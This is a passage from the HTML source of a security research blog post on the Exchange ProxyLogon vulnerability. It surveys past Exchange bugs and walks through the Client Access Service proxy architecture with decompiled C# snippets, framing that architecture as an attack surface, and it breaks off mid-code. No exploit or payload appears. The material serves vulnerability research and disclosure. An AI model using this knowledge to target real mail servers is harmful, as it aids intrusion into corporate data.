&lt;p&gt;Regarding the ProxyLogon PoC we reported to MSRC appeared in the wild in late February, we were as curious as everyone after eliminating the possibility of leakage from our side through a thorough investigation. With a clearer timeline appearing and more discussion occurring, it seems like this is &lt;a href=&quot;https://msrc-blog.microsoft.com/2012/03/16/proof-of-concept-code-available-for-ms12-020/&quot;&gt;not the first time that something like this happened to Microsoft&lt;/a&gt;. Maybe you would be interested in learning some &lt;a href=&quot;https://www.wsj.com/articles/microsoft-probing-whether-leak-played-role-in-suspected-chinese-hack-11615575793&quot;&gt;interesting stories from here&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;why-targeting-on-exchange-server&quot;&gt;Why targeting on Exchange Server?&lt;/h1&gt;

&lt;p&gt;Mail server is a highly valuable asset that holds the most confidential secrets and corporate data. In other words, controlling a mail server means controlling the lifeline of a company. As the most common-use email solution, Exchange Server has been the top target for hackers for a long time. Based on our research, there are more than four hundred thousands Exchange Servers exposed on the Internet. Each server represents a company, and you can imagine how horrible it is while a severe vulnerability appeared in Exchange Server.&lt;/p&gt;

&lt;p&gt;Normally, I will review the existing papers and bugs before starting a research. Among the whole Exchange history, is there any interesting case? Of course. Although most vulnerabilities are based on known attack vectors, such as the deserialization or bad input validation, there are still several bugs that are worth mentioning.&lt;/p&gt;

&lt;h3 id=&quot;the-most-special&quot;&gt;The most special&lt;/h3&gt;
&lt;p&gt;The most special one is the &lt;a href=&quot;https://msrc-blog.microsoft.com/2017/07/20/englishmansdentist-exploit-analysis/&quot;&gt;arsenal&lt;/a&gt; from &lt;a href=&quot;https://en.wikipedia.org/wiki/Equation_Group&quot;&gt;Equation Group&lt;/a&gt; in 2017. Itâ€™s the only practical and public pre-auth RCE in the Exchange history. Unfortunately, the arsenal only works on an ancient Exchange Server 2003. If the arsenal leak happened earlier, it could end up with another nuclear-level crisis.&lt;/p&gt;

&lt;h3 id=&quot;the-most-interesting&quot;&gt;The most interesting&lt;/h3&gt;
&lt;p&gt;The most interesting one is &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange&quot;&gt;CVE-2018-8581&lt;/a&gt; disclosed by someone who cooperated with ZDI. Though it was simply an SSRF, with the feature, it could be combined with NTLM Relay, the attacker could turn a boring SSRF into &lt;a href=&quot;https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&quot;&gt;something really fancy&lt;/a&gt;. For instance, it could directly control the whole Domain Controller through a low privilege account.&lt;/p&gt;

&lt;h3 id=&quot;the-most-surprising&quot;&gt;The most surprising&lt;/h3&gt;
&lt;p&gt;The most surprising one is &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688&lt;/a&gt;, which was also disclosed by someone working with ZDI. The root cause of this bug is due to a hard-coded cryptographic key in Microsoft Exchange. With this hard-coded key, an attacker with low privilege can take over the whole Exchange Server. And as you can see, even in 2020, a silly, hard-coded cryptographic key could still be found in an essential software like Exchange. This indicated that Exchange is lacking security reviews, which also inspired me to dig more into the Exchange security.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/2.gif&quot; alt=&quot;&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;where-is-the-new-attack-surface&quot;&gt;Where is the new attack surface&lt;/h1&gt;

&lt;p&gt;Exchange is a very sophisticated application. Since 2000, Exchange has released a new version every 3 years. Whenever Exchange releases a new version, the architecture changes a lot and becomes different. The changes of architecture and iterations make it difficult to upgrade an Exchange Server. In order to ensure the compatibility between the new architecture and old ones, several design debts were incurred to Exchange Server and led to the new attack surface we found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Where did we focus at Microsoft Exchange? We focused on the Client Access Service, CAS. CAS is a fundamental component of Exchange. Back to the version 2000/2003, CAS was an independent Frontend Server in charge of all the Frontend web rendering logics. After several renaming, integrating, and version differences, CAS has been downgraded to a service under the Mailbox Role. The &lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/architecture/architecture?view=exchserver-2019&quot;&gt;official documentation from Microsoft&lt;/a&gt; indicates that:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Mailbox servers contain the Client Access services that &lt;strong&gt;accept client connections for all protocols&lt;/strong&gt;. These frontend services are &lt;strong&gt;responsible for routing or proxying connections&lt;/strong&gt; to the corresponding backend services on a Mailbox server&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;From the narrative you could realize the importance of CAS, and you could imagine how critical it is when bugs are found in such infrastructure. CAS was where we focused on, and where the attack surface appeared.&lt;/p&gt;

&lt;h1 id=&quot;the-cas-architecture&quot;&gt;The CAS architecture&lt;/h1&gt;

&lt;p&gt;CAS is the fundamental component in charge of accepting all the connections from the client side, no matter if itâ€™s HTTP, POP3, IMAP or SMTP, and proxies the connections to the corresponding Backend Service. As a Web Security researcher, I focused on the Web implementation of CAS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The CAS web is built on Microsoft IIS. As you can see, there are two websites inside the IIS. The â€œDefault Websiteâ€ is the Frontend we mentioned before, and the â€œExchange Backendâ€ is where the business logic is. After looking into the configuration carefully, we notice that the Frontend is binding with ports 80 and 443, and the Backend is listening on ports 81 and 444. All the ports are binding with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;, which means anyone could access the Frontend and Backend of Exchange directly. Wouldnâ€™t it be dangerous? Please keep this question in mind and we will answer that later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exchange implements the logic of Frontend and Backend via IIS module. There are several modules in Frontend and Backend to complete different tasks, such as the filter, validation, and logging. The Frontend must contain a Proxy Module. The Proxy Module picks up the HTTP request from the client side and adds some internal settings, then forwards the request to the Backend. As for the Backend, all the applications include the Rehydration Module, which is in charge of parsing Frontend requests, populating the client information back, and continuing to process the business logic. Later we will be elaborating how Proxy Module and Rehydration Module work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;frontend-proxy-module&quot;&gt;Frontend Proxy Module&lt;/h2&gt;

&lt;p&gt;Proxy Module chooses a handler based on the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ApplicationPath&lt;/code&gt; to process the HTTP request from the client side. For instance, visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/EWS&lt;/code&gt; will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EwsProxyRequestHandler&lt;/code&gt;, as for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/OWA&lt;/code&gt; will trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OwaProxyRequestHandler&lt;/code&gt;. All the handlers in Exchange inherit the class from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyRequestHandler&lt;/code&gt; and implement its core logic, such as how to deal with the HTTP request from the user, which URL from Backend to proxy to, and how to synchronize the information with the Backend. The class is also the most centric part of the whole Proxy Module, we will separate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyRequestHandler&lt;/code&gt; into 3 sections:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-reqeust-section&quot;&gt;Frontend Reqeust Section&lt;/h3&gt;

&lt;p&gt;The Request section will parse the HTTP request from the client and determine which cookie and header could be proxied to the Backend. Frontend and Backend relied on HTTP Headers to synchronize information and proxy internal status. Therefore, Exchange has defined a blacklist to avoid some internal Headers being misused.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ShouldCopyHeaderToServerRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-IsFromCafe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-SourceCafeServer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;msExchProxyUri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-MSExchangeActivityCtx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;return-client-request-id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-For&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;StartsWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Backend-Diag-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHttpRequestBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsProbeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the last stage of Request, Proxy Module will call the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddProtocolSpecificHeadersToServerRequest&lt;/code&gt; implemented by the handler to add the information to be communicated with the Backend in the HTTP header. This section will also serialize the information from the current login user and put it in a new HTTP header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, which will be forwarded to the Backend later.&lt;/p&gt;

&lt;p&gt;For instance, If I log into Outlook Web Access (OWA) with the name Orange, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; that Frontend proxy to Backend will be:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-proxy-section&quot;&gt;Frontend Proxy Section&lt;/h3&gt;

&lt;p&gt;The Proxy Section first uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetTargetBackendServerURL&lt;/code&gt; method to calculate which Backend URL should the HTTP request be forwarded to. Then initialize a new HTTP Client request with the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateServerRequest&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CreateServerRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseDefaultWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Proxy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NullWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServicePoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionLimit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServicePointConnectionLimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-FE-ClientIP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientIP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-For&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientProxyChainIPs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-Port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-MS-EdgeIP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Utilities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetEdgeServerIpAsProxyHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Exchange will also generate a Kerberos ticket via the HTTP Service-Class of the Backend and put it in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorization&lt;/code&gt; header. This header is designed to prevent anonymous users from accessing the Backend directly. With the Kerberos Ticket, the Backend could validate the access from the Frontend.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProxyKerberosAuthentication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
